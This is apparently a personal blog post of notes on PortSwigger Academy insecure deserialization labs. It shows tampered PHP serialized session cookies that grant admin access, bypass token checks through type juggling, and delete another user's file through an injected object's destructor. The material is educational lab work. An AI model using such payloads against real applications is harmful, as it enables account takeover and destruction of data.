---
title: PortSwigger - Insecure Deserialization Labs
date: '2024-05-10'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

## Insecure Deserialization
 Serialization is a process of converting data into a stream of bytes that is easier to store. To identify insecure deserialization, check all the data passing into an application. Each language has its own way of serializing an object.

These are some short notes I made while solving PortSwigger Academy Insecure Deserialization labs.
##### Manipulating Serialized objects

 -   This is an example of how we can manipulate the attributes within objects to exploit this issue

```php
// A base64 encoded session cookie
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d

// when we decode the cookie we find serialized data, which looks like a php serialized object,
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

// We can change the attribute b:0 to 1 and access admin panel

```


##### Modifying object attributes
- In `php` a string can be equal to integer for example `5 =='5'` will return `true`
- In php `0=='any string'` is also `true`

```php
// We were given a session token which looked like this when decoded :

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"u6ikmj5wteujgew16r49scunlmahe9fn";}

// we changed the access_token value to 0 for the above mentioned string comparison
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

// As username was changed to admin , we were able to login to the admin account
```


##### Using application functionality to exploit insecure deserialiaztion

```php
// in the /delete-account endpoint a serialized cookie was decoded to following
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"unj1mi9zgc9vpf1t7f8ajelk645tg8hp";s:11:"avatar_link";s:19:"users/wiener/avatar";}

// we changed the path and were able to delete file from another account
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"unj1mi9zgc9vpf1t7f8ajelk645tg8hp";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}


```


##### Injecting Arbitrary Objects
- In `php` whenever object of a class is created , a magic method `_construct()` is automatically invoked
- If magic methods are handling attackers controllable data ,they can become dangerous 

```php
// In this example we are given a serialized session cookie.
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJicnIxcHgybDMxMzF6NHFhczQwYWpob3IwYno4bXQ1YyI7fQ%3d%3d

// decoding the cookie we find deserialized objects
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"brr1px2l3131z4qas40ajhor0bz8mt5c";}

// the page accesses /lib directory with the following endpoint https://0a15009004ab348d81c93e0900060088.web-security-academy.net/libs/CustomTemplate.php

// To access the file we add ~ in the end making it CustomTemplate.php~

// We can change cookie to 
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
// The above results in _destruct method being called to delete morale.txt
```


##### Exploting Java Deserialization with Apache Commons

```php
// in this lab we are presented with apache commons collection whihc is known to be vulnerable to insecure deserialization

```
